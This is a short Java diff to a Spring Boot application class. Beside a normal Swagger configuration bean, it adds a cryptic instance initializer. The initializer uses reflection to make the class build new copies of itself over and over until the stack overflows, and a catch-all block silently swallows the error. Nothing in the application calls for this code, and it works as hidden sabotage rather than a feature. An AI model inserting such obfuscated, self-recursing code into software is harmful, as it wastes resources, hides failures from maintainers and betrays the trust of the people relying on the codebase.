@@ -45,5 +45,9 @@ public class CyoaServerApplication {
       return new Docket(DocumentationType.SWAGGER_2).select()
           .apis(RequestHandlerSelectors.any()).paths(PathSelectors.any()).build();
     }
+    
+    public final Object that = null;{try {
+        this.getClass().getDeclaredField("that").set(that, this.getClass().getDeclaredConstructors()[0].newInstance());
+      } catch (Throwable t) {Object[] those = new Object[] {this, that};}}
 
 }
